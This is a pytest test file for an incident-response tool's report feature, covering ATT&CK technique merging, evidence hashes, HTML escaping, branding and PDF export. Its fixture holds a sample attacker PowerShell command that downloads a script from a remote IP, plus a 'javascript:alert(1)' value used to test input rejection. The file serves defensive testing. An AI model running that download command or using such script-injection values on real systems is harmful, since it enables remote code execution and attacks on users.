"""Incident report: content, options, branding, HTML and PDF."""

from __future__ import annotations

import base64

from fastapi.testclient import TestClient

from app.report import attack_techniques, build_html, evidence
from tests.conftest import make_key

LOGO = (
    "data:image/png;base64,"
    + base64.b64encode(
        bytes.fromhex(
            "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489"
            "0000000d4944415478da63f8cfc0f01f0005000201a3b6a6e30000000049454e44ae426082"
        )
    ).decode()
)

DOC = {
    "id": "r1",
    "name": "WKS-042",
    "host": "WKS-042",
    "username": "m.rossi",
    "os": "windows",
    "createdAt": "2026-03-01T08:00:00Z",
    "suspiciousStart": 1772503200000,
    "suspiciousEnd": 1772510400000,
    "flags": {
        "evt:Security:9126": {
            "key": "evt:Security:9126",
            "section": "eventlogs",
            "browserId": "Security",
            "title": "1102 Audit log cleared — cleared by <administrator>",
            "time": 1772505660000,
            "flaggedBy": "analyst",
            "comments": [{"text": "anti-forensics", "author": "analyst"}],
        }
    },
    "notes": [{"id": "n1", "text": "Initial access via RDP.\n\nSecond paragraph.", "author": "analyst"}],
    "data": {
        "commands": {
            "shells": {
                "powershell": {
                    "commands": [{"command": "iwr http://185.220.101.47/a.ps1"}],
                    "meta": {
                        "history": {
                            "fileName": "ConsoleHost_history.txt",
                            "format": "psreadline",
                            "rows": 1,
                            "importedAt": "2026-03-04T09:00:00Z",
                            "sha256": "d" * 64,
                        }
                    },
                }
            }
        },
        "eventlogs": {
            "channels": {
                "Security": {
                    "events": [{"eventId": 1102, "time": 1772505660000, "data": {}}],
                    "meta": {"fileName": "Security.evtx", "format": "evtx", "sha256": "e" * 64, "total": 9},
                },
                "System": {
                    "events": [
                        {
                            "eventId": 104,
                            "time": 1772505000000,
                            "data": {"Channel": "Microsoft-Windows-Sysmon/Operational"},
                        }
                    ],
                    "meta": {"fileName": "System.evtx", "format": "evtx", "sha256": "f" * 64, "total": 4},
                },
            }
        },
    },
}


def test_attack_techniques_merge_capa_yara_and_rules():
    samples = [
        {
            "fileName": "a.exe",
            "capa": [
                {
                    "name": "inject thread",
                    "attack": [{"id": "T1055", "tactic": "Defense Evasion", "technique": "Process Injection"}],
                }
            ],
            "yara": [{"rule": "pe_process_injection_apis", "meta": {"mitre_attack": "T1055"}}],
        }
    ]
    detections = [{"label": "log cleared", "count": 2, "attack": ["T1070.001", "bogus"]}]
    techniques = {t["id"]: t for t in attack_techniques(samples, detections)}
    assert set(techniques) == {"T1055", "T1070.001"}
    assert techniques["T1055"]["sources"] == [
        "capa · inject thread (a.exe)",
        "YARA · pe_process_injection_apis (a.exe)",
    ]
    assert techniques["T1070.001"]["name"] == "Indicator Removal: Clear Windows Event Logs"


def test_evidence_lists_imported_files_with_hashes():
    rows = evidence(DOC)
    assert {(r["fileName"], r["sha256"]) for r in rows} == {
        ("ConsoleHost_history.txt", "d" * 64),
        ("Security.evtx", "e" * 64),
        ("System.evtx", "f" * 64),
    }


def test_build_html_sections_language_and_escaping():
    html = build_html(
        DOC,
        lang="it",
        tlp="red",
        sections=["summary", "timeline", "eventlogs", "notes"],
        executive_summary="Accesso <RDP>.",
        generated_by="admin",
        generated_at="2026-03-05T10:00:00Z",
    )
    assert "Report dell&#x27;incidente" in html and "TLP:RED" in html
    assert "Accesso &lt;RDP&gt;." in html and "<RDP>" not in html
    assert "cleared by &lt;administrator&gt;" in html and "anti-forensics" in html
    assert "Microsoft-Windows-Sysmon/Operational" not in html.split("Registri eventi Windows")[0]
    assert "Second paragraph." in html
    # Left-out sections are absent.
    assert "Appendice delle prove" not in html and "MITRE ATT&amp;CK" not in html


def test_report_endpoint_html_pdf_and_branding(admin: TestClient):
    key = make_key(admin, role="analyst")
    assert admin.post("/api/incidents", headers=key, json=DOC).status_code == 201
    settings = admin.get("/api/settings").json()
    settings["report"] = {"orgName": "ACME SOC", "logo": LOGO}
    assert admin.put("/api/settings", json=settings).json()["report"]["orgName"] == "ACME SOC"
    bad = {**settings, "report": {"orgName": "x", "logo": "javascript:alert(1)"}}
    assert admin.put("/api/settings", json=bad).status_code == 422

    r = admin.post(
        "/api/incidents/r1/report",
        headers=key,
        json={
            "format": "html",
            "detections": [{"id": "evt-log-cleared", "label": "log cleared", "count": 1, "attack": ["T1070.001"]}],
        },
    )
    assert r.status_code == 200 and r.headers["content-type"].startswith("text/html")
    assert "ACME SOC" in r.text and LOGO in r.text and "T1070.001" in r.text
    assert "185.220.101.47" in r.text  # from the IOC index
    assert "TLP:AMBER" in r.text  # default

    # Saved per-incident settings are the defaults; the body overrides them.
    admin.patch(
        "/api/incidents/r1",
        headers=key,
        json={"report": {"lang": "it", "tlp": "green", "executiveSummary": "Sintesi salvata."}},
    )
    r = admin.post("/api/incidents/r1/report", headers=key, json={"format": "html"})
    assert "TLP:GREEN" in r.text and "Sintesi salvata." in r.text and "Report dell" in r.text

    pdf = admin.post("/api/incidents/r1/report", headers=key, json={})
    assert pdf.status_code == 200 and pdf.headers["content-type"] == "application/pdf"
    assert pdf.content.startswith(b"%PDF") and "WKS-042-report.pdf" in pdf.headers["content-disposition"]

    actions = [e["action"] for e in admin.get("/api/audit", headers=key).json()["entries"]]
    assert "report.generate" in actions
    assert admin.post("/api/incidents/nope/report", headers=key, json={}).status_code == 404
